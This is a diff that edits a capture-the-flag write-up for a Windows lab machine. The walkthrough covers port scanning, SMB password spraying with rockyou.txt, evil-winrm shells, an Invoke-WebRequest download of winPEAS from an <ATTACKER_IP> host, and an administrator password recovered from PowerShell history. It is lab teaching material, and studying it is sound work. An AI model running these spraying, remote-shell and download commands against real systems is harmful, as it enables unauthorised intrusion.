@@ -14,9 +14,9 @@ A leaked username in `tasks.txt` is sprayed against SMB with `rockyou.txt`, land
 
 ## Enumeration
 
-### Port Scanning
+### Port Enumeration
 
-A full TCP port scan is run first:
+A full TCP port scan comes first:
 
 ```bash
 $ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn admin.nyx
@@ -39,7 +39,7 @@ PORT      STATE SERVICE      REASON
 MAC Address: 08:00:27:5C:74:31 (Oracle VirtualBox virtual NIC)
 ```
 
-A version/script scan against the open ports fills in the details — a typical Windows spread, with SMB, WinRM (5985), and a web server on 80:
+A version and script scan on the open ports fills in the details — a typical Windows spread, with SMB, WinRM (5985), and a web server on 80:
 
 ```bash
 $ sudo nmap -p 80,135,139,445,5040,5985,47001,49664,49665,49666,49667,49668,49669,49670 -sCV admin.nyx
@@ -87,6 +87,7 @@ Host script results:
 $ nxc smb admin.nyx
 SMB         admin.nyx       445    ADMIN            [*] Windows 10 / Server 2019 Build 19041 x64 (name:ADMIN) (domain:ADMIN) (signing:False) (SMBv1:None)
 ```
+
 ```bash
 $ nxc smb admin.nyx -u '' -p '' --shares
 SMB         admin.nyx       445    ADMIN            [*] Windows 10 / Server 2019 Build 19041 x64 (name:ADMIN) (domain:ADMIN) (signing:False) (SMBv1:None)
@@ -94,13 +95,14 @@ SMB         admin.nyx       445    ADMIN            [-] ADMIN\: STATUS_ACCESS_DE
 SMB         admin.nyx       445    ADMIN            [-] Error enumerating shares: Error occurs while reading from remote(104)
 ```
 
-The null-session attempt confirms the box's hostname and workgroup (both `ADMIN`) but goes no further — share enumeration comes back with `STATUS_ACCESS_DENIED`, so no shares are listed this way.
+The null-session attempt confirms the box's hostname and workgroup (both `ADMIN`) but goes no further — share enumeration comes back `STATUS_ACCESS_DENIED`, so no shares list this way. Access needs credentials, which points back to the web server.
 
 ### Web Enumeration
 
 ```
 http://admin.nyx
 ```
+
 <img src="../Images/admin/Pasted image 20260603225758.png"/>
 
 A content discovery scan turns up a text file:
@@ -116,6 +118,7 @@ TASKS.txt            [Status: 200, Size: 98, Words: 17, Lines: 9, Duration: 23ms
 ```
 http://admin.nyx/tasks.txt
 ```
+
 ```plaintext
 Pending tasks:
 
@@ -128,11 +131,13 @@ Pending tasks:
 By hope
 ```
 
+The note is signed "By hope" — a username to work with, and the "Change password" line hints it may still be a weak one.
+
 ## Initial Access
 
 ### Password Spraying
 
-With a username in hand, `rockyou.txt` is sprayed against SMB. The wordlist is converted to UTF-8 first, since its default encoding can trip up some tools' password comparisons:
+With a username in hand, the next step sprays `rockyou.txt` against SMB for that single user. A quick conversion to UTF-8 first avoids an encoding quirk that can trip up some tools' password comparisons:
 
 ```bash
 $ iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt -o rockyou-utf8.txt
@@ -145,34 +150,29 @@ SMB         admin.nyx       445    ADMIN            [-] ADMIN\hope:candy STATUS_
 SMB         admin.nyx       445    ADMIN            [-] ADMIN\hope:fuckyou2 STATUS_LOGON_FAILURE
 SMB         admin.nyx       445    ADMIN            [+] ADMIN\hope:loser
 ```
+
 > **Credentials:** `hope:loser`
 
+The `[+]` on `hope:loser` confirms the pair over SMB before moving to a real session:
+
 ```bash
-┌──(kali㉿kali)-[~]
-└─$ nxc smb admin.nyx -u 'hope' -p 'loser' -x 'id'
+$ nxc smb admin.nyx -u 'hope' -p 'loser' -x 'id'
 SMB         admin.nyx       445    ADMIN            [*] Windows 10 / Server 2019 Build 19041 x64 (name:ADMIN) (domain:ADMIN) (signing:False) (SMBv1:None)
 SMB         admin.nyx       445    ADMIN            [+] ADMIN\hope:loser
 ```
 
 ### Shell as hope
 
+`hope` isn't a local admin, but the WinRM ports open earlier mean the account can still get an interactive session with `evil-winrm`:
+
 ```bash
 $ evil-winrm -i admin.nyx -u hope -p loser
 
-Evil-WinRM shell v3.9
-
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\hope\Documents> whoami
 admin\hope
 ```
 
 ```powershell
-*Evil-WinRM* PS C:\Users\hope\Documents> whoami
-admin\hope
 *Evil-WinRM* PS C:\Users\hope\Documents> dir C:\Users\hope\Desktop
 
 
@@ -194,7 +194,7 @@ aacd4aebb5743ba45d3b4591ac03ace1
 
 ### Credentials Leaked in PowerShell History
 
-`winPEAS` is pulled down and run to automate the usual privilege escalation checks:
+Pulling down and running `winPEAS` automates the usual privilege-escalation checks:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\hope\Documents> Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/winPEASany.exe -OutFile C:\Users\hope\Desktop\winPEASany.exe
@@ -217,20 +217,11 @@ Set-LocalUser -Name "administrator" -Password (ConvertTo-SecureString "SuperAdmi
 ```bash
 $ evil-winrm -i admin.nyx -u 'Administrator' -p 'SuperAdministrator123'
 
-Evil-WinRM shell v3.9
-
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\administrator\Documents> whoami
 admin\administrator
 ```
 
 ```powershell
-*Evil-WinRM* PS C:\Users\administrator\Documents> whoami
-admin\administrator
 *Evil-WinRM* PS C:\Users\administrator\Documents> dir C:\Users\administrator\Desktop
 
 
